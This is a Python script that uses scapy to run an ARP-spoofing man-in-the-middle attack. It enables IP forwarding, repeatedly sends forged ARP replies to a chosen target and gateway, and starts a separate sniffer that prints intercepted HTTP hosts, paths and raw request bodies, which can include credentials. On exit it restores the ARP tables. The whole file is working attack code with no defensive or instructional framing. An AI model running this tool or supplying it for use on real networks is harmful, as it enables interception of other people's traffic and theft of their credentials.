import scapy.all as scapy
import time
import optparse as opt
import ipaddress
import logging
import subprocess
import sys
import os
import signal
from scapy.layers.http import HTTPRequest

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_mac_address(ip_address):
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def get_user_input():
    parse_object = opt.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip",
                            help="Enter Target IP address. For example: 192.168.0.12")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip",
                            help="Enter Gateway IP address. For example: 192.168.0.1")
    parse_object.add_option("-i", "--interface", dest="interface", help="Specify the network interface!")
    (user_input, arguments) = parse_object.parse_args()
    return user_input


def arp_poisoning(target_ip, poisoned_ip):
    target_mac_address = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def reset_operation(target_ip, poisoned_ip):
    target_mac_address = get_mac_address(target_ip)
    gateway_mac_address = get_mac_address(poisoned_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=poisoned_ip,
                             hwsrc=gateway_mac_address)
    scapy.send(arp_response, verbose=False, count=5)


def packet_listener(interface):
    print(f"[*] Starting packet listener on {interface}")
    scapy.sniff(iface=interface, store=False, prn=analyse_packet)


def analyse_packet(packet):
    if packet.haslayer(HTTPRequest):
        print("[+] HTTP Request found")
        if packet[HTTPRequest].Host and packet[HTTPRequest].Path:
            print(f"Host: {packet[HTTPRequest].Host.decode()} | Path: {packet[HTTPRequest].Path.decode()}")
        if packet.haslayer(scapy.Raw):
            print(f"Raw Data: {packet[scapy.Raw].load.decode(errors='ignore')}")


def ask_user_to_install(terminal):
    try:
        user_response = input(f"{terminal} is not installed. Would you like to install it? (y/n): ").lower()
        if user_response == 'y':
            subprocess.call(['apt-get', 'install', terminal])
            return True
        return False
    except KeyboardInterrupt:
        print("\n[INFO] Installation process interrupted by the user (CTRL + C). Exiting...")
        sys.exit(0)


def try_start_listener(user_input):
    terminals = ['gnome-terminal', 'xfce4-terminal', 'konsole', 'xterm']

    for terminal in terminals:
        try:
            process = subprocess.Popen(
                [terminal, '--', 'bash', '-c', f'python3 {sys.argv[0]} listener {user_input.interface}; exec bash'])
            terminal_pid = process.pid
            print(f"Started terminal with PID: {terminal_pid}")
            return terminal_pid
        except FileNotFoundError:
            if ask_user_to_install(terminal):
                process = subprocess.Popen(
                    [terminal, '--', 'bash', '-c', f'python3 {sys.argv[0]} listener {user_input.interface}; exec bash'])
                terminal_pid = process.pid
                print(f"Started terminal with PID: {terminal_pid}")
                return terminal_pid

    print("Error: No suitable terminal found. Please install one of the terminals manually.")
    return None


def ip_forward():
    try:
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

        number = 0
        user_input = get_user_input()
        target_ip = str(ipaddress.ip_address(user_input.target_ip))
        gateway_ip = str(ipaddress.ip_address(user_input.gateway_ip))

        terminal_pid = None

        if sys.argv[1] != 'listener':
            terminal_pid = try_start_listener(user_input)

        try:
            while True:
                arp_poisoning(target_ip, gateway_ip)
                arp_poisoning(gateway_ip, target_ip)
                number += 2
                print(f"\rSending packets: {number}", end="")
                time.sleep(5)
        except KeyboardInterrupt:
            print("\nQuitting & resetting...")
            reset_operation(target_ip, gateway_ip)
            reset_operation(gateway_ip, target_ip)

            if terminal_pid is not None:
                os.kill(terminal_pid, signal.SIGTERM)
    except Exception as e:
        print(f"Error: {str(e)}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "listener":
        interface = sys.argv[2]
        packet_listener(interface)
    else:
        ip_forward()
